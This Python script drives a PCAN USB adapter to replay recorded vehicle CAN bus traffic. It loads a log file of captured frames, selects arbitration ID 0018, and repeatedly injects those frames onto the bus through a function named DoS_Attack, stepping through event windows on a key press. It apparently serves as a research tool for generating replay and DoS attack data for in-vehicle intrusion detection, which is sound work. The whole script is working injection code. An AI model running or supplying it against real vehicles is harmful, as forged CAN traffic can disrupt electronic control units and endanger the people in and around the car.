from PCANBasic import *
import random
import time
import pandas as pd
from os import walk
import keyboard

unused_bits = {'0165': [3, '00'], '051A': [0, '00'], '02B0': [3, '07'], '00A0': [6, '00'],
 '05E4': [0, '00'], '0153': [4, '00'], '02A0': [1, '00'], '0120': [0, '00'], '043F': [2, '60'],
 '0316': [7, '7F'], '04B1': [4, '00'], '0050': [0, '00'], '0164': [0, '00'], '0018': [1, '00'],
 '0044': [0, '00'], '0110': [0, 'E0'], '05F0': [0, '00'], '0329': [7, '10'], '0440': [3, '00'],
 '00A1': [2, '80'], '04F2': [4, '00'], '018F': [6, '00'], '0382': [0, '40'], '04F0': [0, '00'],
 '05A2': [0, '25'], '0034': [0, '00'], '0260': [3, '30'], '01F1': [0, '00'], '02C0': [0, '3D'],
 '0517': [1, '00'], '05A0': [0, '00'], '0080': [1, '17'], '04F1': [2, '00'], '0043': [0, '00'],
 '0350': [5, '00'], '059B': [0, '00'], '0081': [3, '00'], '0042': [1, 'FF'], '0510': [0, '00'],
 '0690': [0, '03'], '0587': [0, '00'], '0370': [0, 'FF']}

cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']

mypath = "Filtered Datas"
files = []

for (dirpath, dirnames, filenames) in walk(mypath):
    files.extend(filenames)

#importing dataset
def Convert_to_df(path):
    if path[-3:] == "trc":
        data_df = Convert_from_trc(path)[17:]
    elif path[-3:] == "txt": 
        data_df = Convert_from_txt(path)[1:]
    else:
        print("Error, not suitable file")
        exit()
    return data_df

def Convert_from_trc(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

#importing dataset
def Convert_from_txt(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split("\t")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Data_Analyzer(dataframe, ID):
    spec = dataframe[dataframe["ID"] == ID]
    new_col = []
    for i in range(8):
        new_col.append(cols[i+5])
        
    spec['All_Datas'] = spec[new_col].agg(' '.join, axis=1) 
    return list(spec['All_Datas'])


def DoS_Attack(id, data):
    all_datas = ""
    Fuzzing_ID = int(id, 16)

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = Fuzzing_ID
    DoS_DATA.LEN = len(data)
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    check_ind = unused_bits[id][0]
    check_val = unused_bits[id][1]
    for i in range(len(data)):
        DoS_DATA.DATA[i] = int(data[i], 16)
        all_datas += str(DoS_DATA.DATA[i]) + "\t"
        # all_datas += data[i]+ "\t"

    print(all_datas)
    CAN.Write(CAN_BUS, DoS_DATA)
    time.sleep(0.5)

event_val_usage = [[0, 44], [44, 45], [45, 48], [48, 53], [53, 58], [58, 63], [63, 75], [75, 115],
 [115, 166], [166, 167], [167, 169], [169, 174], [174, 234], [234, 235], [235, 282], [282, 310],
 [310, 329], [329, 360], [360, 394], [394, 421], [421, 440], [440, 457], [457, 476], [476, 515],
 [515, 519], [519, 523], [523, 527], [527, 532], [532, 536], [536, 540], [540, 544], [544, 549],
 [549, 553], [553, 557], [557, 561], [561, 566], [566, 570], [570, 574], [574, 578], [578, 583],
 [583, 587], [587, 591], [591, 595], [595, 607], [607, 612], [612, 616], [616, 620], [620, 624],
 [624, 629], [629, 633], [633, 637], [637, 641], [641, 646], [646, 650], [650, 654], [654, 658],
 [658, 663], [663, 667], [667, 671], [671, 675], [675, 680], [680, 684], [684, 688], [688, 706],
 [706, 710], [710, 714], [714, 718], [718, 722], [722, 727], [727, 731], [731, 735], [735, 739],
 [739, 744], [744, 748], [748, 752], [752, 756], [756, 761], [761, 765], [765, 769], [769, 773],
 [773, 777], [777, 801], [801, 808], [808, 815], [815, 816], [816, 933], [933, 939], [939, 1009],
 [1009, 1013], [1013, 1017], [1017, 1021], [1021, 1377], [1377, 1477], [1477, 1498], [1498, 1558],
 [1558, 1606], [1606, 1674], [1674, 1677], [1677, 1678], [1678, 1685]]

event_based = [[44, 68], [75, 80], [115, 120], [166, 179], [210, 213], [231, 244], [282, 289], [292, 295],
 [310, 314], [329, 335], [360, 365], [395, 399], [421, 426], [441, 445], [456, 462], [476, 481], [515, 600], [607, 696],
 [706, 782], [801, 821], [903, 908], [933, 944], [955, 958], [1009, 1026], [1212, 1215], [1274, 1277], [1377, 1382], [1477, 1482],
 [1497, 1503], [1558, 1563], [1606, 1611], [1674, 1690]]

if __name__ == "__main__":
    CAN = PCANBasic()                           #CAN 생성자 
    CAN_BUS = PCAN_USBBUS1

    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    if result != PCAN_ERROR_OK:           
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
        exit()
    
    path = "Dataset\\Replay Attack Injected Datas 2023-06-05-2.txt"
    normal_df = Convert_to_df(path)
    injection_id = "0018"
    used_datas = Data_Analyzer(normal_df, injection_id)
    print("LEN of Data: {0}".format(len(used_datas)))
    i = 0
    ind = 0
    time_set = 0
    # while ind <= 500:
    # for i in range(len(used_datas)):
    while True:
        start_pos, end_pos = event_based[ind]
        for i in range(start_pos, end_pos):
            try:    
                if keyboard.is_pressed('q'):  # if key 'q' is pressed 
                    print('You Pressed A Key!')
                    ind += 1
                    time.sleep(0.5)
                    break  # finishing the loop
            except:
                print("some error happened")
                break  # if user pressed a key other than the given key the loop will break

            DoS_Attack(injection_id, used_datas[i].split(" "))
            if i == end_pos - 2:
                i = start_pos
            